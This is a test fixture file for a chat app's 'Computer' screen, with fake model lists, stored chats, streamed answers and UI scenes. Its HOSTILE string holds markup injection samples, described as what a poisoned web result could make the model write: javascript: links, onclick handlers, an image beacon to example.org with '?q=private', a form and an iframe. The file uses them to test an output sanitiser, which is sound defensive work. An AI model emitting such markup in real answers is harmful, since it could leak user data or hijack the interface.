/* Fixtures and scenes for the Computer screen (vendor/padd-computer.js): the model list, stored chats, the
   answer stream, delete and transcribe. Everything is made up. Every variant starts with "comp", and this
   file answers /api/computer/models only for those, so other screens keep the core's key check. */
"use strict";
const zlib = require("zlib");
const {keyOk, denied, now} = require("./scenes-core.js").fixtures;
const M1 = "qwen38fn-sglang-tp2-starfleet", M2 = "deepseek-v4-flash", ALL = ["wiki", "vane", "google"];
const ID = "c0ffee0000000001", NEW = "feedbeef00000002";
const Q = "When did the last off-site backup run, and how big is it?";

/* a small PNG drawn here: a tool result's picture, and the photo the attach scenes pick */
function png(w, h, px){
  const row = w * 3 + 1, raw = Buffer.alloc(row * h);
  for(let y = 0; y < h; y++) for(let x = 0; x < w; x++) raw.set(px(x, y), y * row + 1 + x * 3);
  const crc = b => { let c = ~0; for(const v of b){ c ^= v; for(let k = 0; k < 8; k++) c = c & 1 ? (c >>> 1) ^ 0xedb88320 : c >>> 1; } return ~c >>> 0; };
  const chunk = (type, data) => { const td = Buffer.concat([Buffer.from(type), data]), out = Buffer.alloc(td.length + 8);
    out.writeUInt32BE(data.length, 0); td.copy(out, 4); out.writeUInt32BE(crc(td), td.length + 4); return out; };
  const hd = Buffer.alloc(13); hd.writeUInt32BE(w, 0); hd.writeUInt32BE(h, 4); hd[8] = 8; hd[9] = 2;
  return Buffer.concat([Buffer.from([137, 80, 78, 71, 13, 10, 26, 10]), chunk("IHDR", hd), chunk("IDAT", zlib.deflateSync(raw)), chunk("IEND", Buffer.alloc(0))]);
}
const BARS = [[22, 62, 0xff9900], [76, 104, 0x99ccff], [130, 44, 0xcc99cc], [184, 122, 0xffcc66]];
const chart = (x, y) => { for(const [x0, hgt, c] of BARS) if(x >= x0 && x < x0 + 36 && y >= 140 - hgt && y < 140) return [c >> 16, (c >> 8) & 255, c & 255];
  return y >= 140 && y < 143 ? [0x33, 0x22, 0x11] : [0x0b, 0x08, 0x03]; };
const PIC = png(240, 150, chart), PICURL = "data:image/png;base64," + PIC.toString("base64");
const PHOTO = png(400, 300, (x, y) => [40 + (x >> 1), 60 + (y >> 2), 120 + ((x + y) >> 3)]);

const call = (i, name, args) => ({id: "call_" + i, type: "function", function: {name, arguments: JSON.stringify(args)}});
const ANSWER = `The last snapshot finished at **03:32** this morning and took 2 minutes. It protects 1.85 TB in 27,862 files.

| Run | Size | Files |
|---|---|---|
| Tonight | 1.85 TB | 27,862 |
| Last week | 1.79 TB | 26,410 |

List the snapshots yourself:

\`\`\`bash
demo-backup snapshot list --all | tail -n 3
\`\`\`

Sources: [Backup notes](https://example.org/notes/backup) and the retention guide.

![chart](https://example.org/pixel.png)`;
const stored = () => ({id: ID, title: "Backup schedule and size", created: now() - 3000, updated: now() - 2400, model: M1, wiki_used: true, messages: [
  {role: "user", content: Q, at: now() - 3000},
  {role: "assistant", content: "", reasoning: "The question is about the off-site backup. The wiki should have the schedule. ", tool_calls: [call(0, "wiki_search", {query: "off-site backup schedule"})], at: now() - 2990},
  {role: "tool", tool_call_id: "call_0", name: "wiki_search", content: "3 pages", images: [], at: now() - 2985},
  {role: "assistant", content: "", reasoning: "One web search for the usual retention rule, with a generic query.", tool_calls: [call(0, "google_search", {query: "snapshot retention daily weekly monthly"})], at: now() - 2980},
  {role: "tool", tool_call_id: "call_0", name: "google_search", content: "5 results", images: [PICURL], at: now() - 2970},
  {role: "assistant", content: ANSWER, at: now() - 2960},
  {role: "user", content: "Which model is answering?", at: now() - 2420},
  {role: "assistant", content: "`qwen38fn-sglang`, resident on both Sparks at about 31 tokens per second.", at: now() - 2400},
]});
const chats = () => [
  {id: ID, title: "Backup schedule and size", updated: now() - 2400, model: M1},
  {id: "c0ffee0000000003", title: "Compare two reranker models for the demo search", updated: now() - 9000, model: M1},
  {id: "c0ffee0000000004", title: "Draft a release note for demo-app-1", updated: now() - 86400 * 2, model: "gemma4-26b-55tps-jean-luc"},
  {id: "c0ffee0000000005", title: "Image", updated: now() - 86400 * 6, model: null},
];
const servers = variant => ({
  wiki: {web: false, tools: ["wiki_overview", "wiki_read", "wiki_related", "wiki_search"], error: variant === "comp-down" ? "connection refused" : null},
  vane: {web: true, tools: ["vane_deep_research", "vane_search"], error: null},
  google: {web: true, tools: ["google_search"], error: null} });
/* what a poisoned web result could make the model write: every line tries one way out of the answer box */
const HOSTILE = `Status is fine. <a href="#/command" data-act="cmd-slide" data-arg="red" id="p-alert" class="p-scrim on">Open the report</a>

<span data-act="unload" class="p-sheet on" id="p-toast">tap me</span> <button data-act="pin" data-arg="1">Load</button>

<img src="https://example.org/t.png?q=private"> <img src="//example.org/u.png"> ![x](http://example.org/v.png)

<style>#p-tabs{display:none}</style><form action="https://example.org"><input name="k"></form><iframe src="https://example.org"></iframe>

[run](javascript:alert(1)) <b onclick="alert(1)" style="position:fixed;inset:0">bold</b>

\`\`\`js
const ok = "<b data-act='unload'>still text</b>";
\`\`\``;
const stream = (id, variant) => variant === "comp-hostile" ? [{type: "chat", id, title: Q.slice(0, 60), wiki_used: false}, {type: "token", text: HOSTILE}, {type: "done", id}]
  : variant === "comp-refused" ? [{type: "error", text: "That model is not loaded. Computer only uses resident models; load one in the Model Registry first."}]
  : variant === "comp-broken" ? [{type: "chat", id, title: Q.slice(0, 60), wiki_used: false}, {type: "tool_call", name: "wiki_search", args: {query: "off-site backup"}}, {type: "token", text: "The last snapshot finished at"}]
  : [{type: "chat", id, title: Q.slice(0, 60), wiki_used: false},
     {type: "reasoning", text: "The question is about the backup. "}, {type: "reasoning", text: "The wiki should have the schedule."},
     {type: "tool_call", name: "wiki_search", args: {query: "off-site backup schedule"}},
     {type: "tool_result", name: "wiki_search", text: "3 pages", images: [], guarded: false},
     {type: "tool_call", name: "google_search", args: {query: variant === "comp-guard" ? "demo customer backup contract" : "snapshot retention daily weekly monthly"}},
     {type: "tool_result", name: "google_search", text: "5 results", images: variant === "comp-guard" ? [] : [PICURL], guarded: variant === "comp-guard"},
     {type: "token", text: "The last snapshot finished at **03:32** this morning and took 2 minutes. "},
     {type: "token", text: "It protects 1.85 TB in 27,862 files.\n\nThe next one runs tonight at 03:30."},
     {type: "done", id}];

let polls = 0;                       /* comp-broken: the stored chat is "still being answered" on the first look */
exports.get = (p, variant, q, h) => {
  if(!/^comp/.test(variant || "") || !p.startsWith("/api/computer/")) return;
  if(p === "/api/computer/models") return !keyOk(h) ? denied : {servers: servers(variant),
    models: variant === "comp-none" ? [] : variant === "comp-two" ? [{id: M1, vision: true}, {id: M2, vision: false}] : [{id: M1, vision: true}]};
  if(p === "/api/computer/chats") return keyOk(h) ? {chats: variant === "comp-nochats" ? [] : chats()} : denied;
  if(p === "/api/computer/chat"){
    if(!keyOk(h)) return denied;
    if(variant === "comp-broken") return polls++ < 1 ? {__status: 404, body: {error: "[Errno 2] No such file or directory"}}
      : {id: NEW, title: Q.slice(0, 60), updated: Date.now() / 1000 + 1, model: M1, messages: [{role: "user", content: Q},
          {role: "assistant", content: "", tool_calls: [call(0, "wiki_search", {query: "off-site backup"})]}, {role: "tool", name: "wiki_search", content: "3 pages", images: []},
          {role: "assistant", content: "The last snapshot finished at **03:32** this morning. It protects 1.85 TB in 27,862 files."}]};
    return q.get("id") === ID ? stored() : {__status: 404, body: {error: "[Errno 2] No such file or directory"}};
  }
};
exports.post = (p, body, variant, h) => {
  if(!p.startsWith("/api/computer/") || p === "/api/computer/sessions") return;
  if(!["/api/computer/send", "/api/computer/delete", "/api/computer/transcribe"].includes(p)) return;
  if(!keyOk(h)) return denied;
  if(p === "/api/computer/send"){ polls = 0; return {__sse: stream((body && body.id) || NEW, variant)}; }
  if(p === "/api/computer/delete") return {ok: true};
  return variant === "comp-busy" ? {__status: 409, body: {error: "Both Sparks are too busy for transcription right now; try again shortly."}}
    : {text: "What is the status of the off-site backup?", language: "en", node: "kathryn"};
};

const ta = ".p-input textarea", main = '[data-act="comp-main"]', act = (a, arg) => `[data-act="comp-${a}"]${arg ? `[data-arg="${arg}"]` : ""}`;
const sent = o => ["/api/computer/send", Object.assign({id: null, text: Q, model: M1, tools: ALL, images: []}, o)];
const ask = async (t, text) => { await t.type(ta, text || Q); await t.wait(300); await t.tap(main); await t.wait(500); };
const fake = page => page.evaluate(() => { PADD._test.recorder = true; });
const must = async (page, fn, arg, what) => { if(!await page.evaluate(fn, arg)) throw new Error(what); };
const draft = (page, text) => must(page, x => document.querySelector(".p-input textarea").value === x, text, "the field does not hold: " + text);
const kept = (page, k, v) => must(page, ([k, v]) => localStorage.getItem(k) === v, [k, v], `localStorage ${k} is not "${v}" (the desktop page reads the same key)`);
const WAV = "<8044 bytes>";        /* what the harness records for the body: a 44-byte WAV header and 0.25 s of 16 kHz PCM16 */
const heard = ["/api/computer/transcribe", WAV];
const C = (name, o) => Object.assign({name: "comp-" + name, hash: "#/computer", variant: "comp"}, o);

const attach = C("attach", { async run(page, t){
  await page.setInputFiles(".p-comp input[type=file]", [{name: "photo-1.png", mimeType: "image/png", buffer: PHOTO}, {name: "photo-2.png", mimeType: "image/png", buffer: PIC}]);
  await t.wait(500); await t.shot("two");
  await t.tap(act("unattach", "0")); await t.shot("one-left");
  const url = await page.evaluate(() => document.querySelector(".p-catt img").src);
  if(!/^data:image\/jpeg;base64,/.test(url)) throw new Error("the attached image is not a JPEG data URL");
  attach.posts = [sent({text: "What does this chart show?", images: [url]})];   /* the body carries exactly the picture that is left */
  await ask(t, "What does this chart show?");
}});

exports.scenes = [
  C("empty"),
  C("chat", {hash: "#/computer/" + ID, async run(page, t){ await t.wait(300); await t.shot("end");
    await page.evaluate(() => { document.querySelector(".p-clog").scrollTop = 0; }); await t.tap(".p-cthink summary"); }}),
  C("send", {posts: [sent()], async run(page, t){ await t.type(ta, Q); await t.wait(300); await t.shot("typed"); await t.tap(main); await t.wait(500); }}),
  /* one tap is one action: Engage turns into the microphone under the finger, and a double tap must not start a recording */
  C("send-double-tap", {posts: [sent()], async run(page, t){ await t.type(ta, Q); await t.wait(400); await page.locator(main).tap(); await page.locator(main).tap(); await t.wait(600);
    if(await page.evaluate(() => document.querySelector('[data-act="comp-main"]').className) !== "p-mic mic") throw new Error("the second tap changed the button"); }}),
  C("send-followup", {hash: "#/computer/" + ID, posts: [sent({id: ID, text: "And the one before?"})], run: (page, t) => ask(t, "And the one before?")}),
  C("send-guarded", {variant: "comp-guard", posts: [sent()], run: (page, t) => ask(t)}),
  C("send-hostile", {variant: "comp-hostile", posts: [sent()], async run(page, t){ await ask(t);
    const bad = await page.evaluate(() => { const a = document.querySelector(".p-ma"), out = [];
      for(const q of ["[data-act]", "[data-arg]", "[id]", "[style]", "[onclick]", "button", "style", "form", "input", "iframe", "img[src]", "a[href^='javascript']", "[class]:not(code):not(code *)"])
        if(a.querySelector(q)) out.push(q);
      if(!a.querySelector("pre code.language-js")) out.push("the code block lost its language");
      if(!/still text/.test(a.querySelector("pre").textContent)) out.push("the code block lost its text");
      return out; });
    if(bad.length) throw new Error("got through the sanitiser: " + bad.join(" "));
    await page.locator(".p-ma a").first().tap(); await t.wait(300);                 /* "Open the report": a link to #/command must not change the screen */
    if(!/^#\/computer/.test(await page.evaluate(() => location.hash))) throw new Error("model text changed the route"); }}),
  C("send-refused", {variant: "comp-refused", posts: [sent()], run: (page, t) => ask(t)}),
  C("send-broken", {variant: "comp-broken", posts: [sent()], async run(page, t){ await ask(t); await t.shot("waiting"); await t.wait(3800);
    await must(page, () => /27,862 files/.test(document.querySelector(".p-clog").textContent), null, "the stored answer was not shown"); }}),
  /* a stream that neither ends nor fails (a socket left half dead while the app slept): a fetch stand-in keeps one open, then
     the page "comes back to the foreground"; after 6 s of silence the stream is dropped and the stored chat shown */
  C("send-hung", {variant: "comp-broken", async run(page, t){
    await page.evaluate(id => { const real = window.fetch, line = e => "data: " + JSON.stringify(e) + "\n\n";
      window.fetch = (u, o) => String(u) !== "/api/computer/send" ? real(u, o) : Promise.resolve(new Response(new ReadableStream({start(c){
        c.enqueue(new TextEncoder().encode(line({type: "chat", id, title: "Backup"}) + line({type: "token", text: "The last snapshot"}))); }}))); }, NEW);
    await ask(t); await page.evaluate(() => document.dispatchEvent(new Event("visibilitychange"))); await t.shot("silent"); await t.wait(10500);
    await must(page, () => /27,862 files/.test(document.querySelector(".p-clog").textContent), null, "the stored answer was not shown"); }}),
  C("send-offline", {async run(page, t){ await page.route("**/api/computer/send", r => r.abort()); await ask(t); await draft(page, Q); }}),
  C("send-stale-key", {posts: [sent(), sent()], async run(page, t){ await t.type(ta, Q); await t.wait(300); await page.evaluate(() => localStorage.setItem("starfleetKey", "stale"));
    await t.tap(main); await t.shot("asked"); await t.type("#p-keyin", "fixture-key"); await t.tap("#p-keygo"); await t.wait(600); }}),
  C("send-no-key-given", {posts: [sent()], async run(page, t){ await t.type(ta, Q); await t.wait(300); await page.evaluate(() => localStorage.setItem("starfleetKey", "stale"));
    await t.tap(main); await t.tap(".p-sheet .p-x"); await t.wait(300); await draft(page, Q); await page.evaluate(() => localStorage.setItem("starfleetKey", "fixture-key")); }}),
  C("new", {hash: "#/computer/" + ID, async run(page, t){ await t.tap(act("new"));
    await must(page, () => !document.querySelector(".p-mu,.p-cbot") && location.hash === "#/computer", null, "New left messages or the chat id behind"); }}),
  C("chats", {run: (page, t) => t.tap(act("chats"))}),
  C("chats-none", {variant: "comp-nochats", run: (page, t) => t.tap(act("chats"))}),
  C("chats-open", {async run(page, t){ await t.tap(act("chats")); await t.tap(act("load", ID)); await t.wait(400); }}),
  C("delete", {posts: [["/api/computer/delete", {id: "c0ffee0000000003"}]],
    async run(page, t){ await t.tap(act("chats")); await t.tap(act("del", "c0ffee0000000003")); await t.shot("asked"); await t.tap('[data-k="yes"]'); }}),
  C("delete-cancel", {async run(page, t){ await t.tap(act("chats")); await t.tap(act("del", "c0ffee0000000003")); await t.tap('[data-k="no"]'); }}),
  C("delete-open-chat", {hash: "#/computer/" + ID, posts: [["/api/computer/delete", {id: ID}]],
    async run(page, t){ await t.tap(act("chats")); await t.shot("list"); await t.tap(act("del", ID)); await t.tap('[data-k="yes"]'); }}),
  C("model-sheet", {variant: "comp-two", run: (page, t) => t.tap(act("models"))}),
  C("model-pick", {variant: "comp-two", posts: [sent({model: M2})], async run(page, t){ await t.tap(act("models")); await t.tap(act("model", M2)); await t.shot("picked"); await kept(page, "computerModel", M2); await ask(t); }}),
  C("tools", {posts: [sent({tools: ["wiki", "vane"]})], async run(page, t){ await t.tap(act("tool", "google")); await t.shot("google-off"); await kept(page, "computerTools", "wiki,vane"); await ask(t); }}),
  C("tools-none", {posts: [sent({tools: []})], async run(page, t){ for(const x of ALL) await t.tap(act("tool", x)); await t.shot("all-off"); await kept(page, "computerTools", "none"); await ask(t); }}),
  C("server-down", {variant: "comp-down"}),
  attach,
  C("image-zoom", {hash: "#/computer/" + ID, async run(page, t){ await page.evaluate(() => { document.querySelector(".p-clog").scrollTop = 0; }); await t.tap(act("img")); }}),
  C("none", {variant: "comp-none"}),
  C("none-with-chat", {variant: "comp-none", hash: "#/computer/" + ID}),
  C("nokey", {key: false}),
  C("nokey-chat-link", {key: false, hash: "#/computer/" + ID}),
  C("kb", {hash: "#/computer/" + ID, async run(page, t){ await t.tap(ta); await t.type(ta, "Compare that with last month.\nThen list what changed,\nand say which of the two runs was faster.");
    await page.evaluate(() => PADD._test.kb(300)); await t.wait(200); }}),
  C("rec", {posts: [heard], async run(page, t){ await fake(page);
    await page.route("**/api/computer/transcribe", async r => { await new Promise(ok => setTimeout(ok, 1500)); await r.fallback(); });
    await t.tap(main); await t.wait(900); await t.shot("recording"); await t.tap(main); await t.shot("transcribing");
    await must(page, () => document.querySelector('[data-act="comp-main"]').className === "p-mic wait", null, "no Wait state while transcribing"); await t.wait(1600);
    await draft(page, "What is the status of the off-site backup?"); }}),            /* the text waits in the field: nothing is sent by itself */
  C("rec-busy", {variant: "comp-busy", posts: [heard], async run(page, t){ await fake(page); await t.tap(main); await t.wait(300); await t.tap(main); await t.wait(400); }}),
  C("ask-shortcut", {hash: "#/bridge", async run(page, t){ await fake(page); await page.evaluate(() => PADD.askComputer()); await t.wait(1300); }}),
  C("old", {shell: "old", hash: "#/computer/" + ID}),
  C("old-kb", {shell: "old", async run(page, t){ await t.tap(ta); await t.type(ta, "How much room is left on the backup volume?"); await page.evaluate(() => PADD._test.kb(300)); await t.wait(200); }}),
  C("small", {shell: "small", hash: "#/computer/" + ID}),
  C("small-two-models", {shell: "small", variant: "comp-two"}),
];
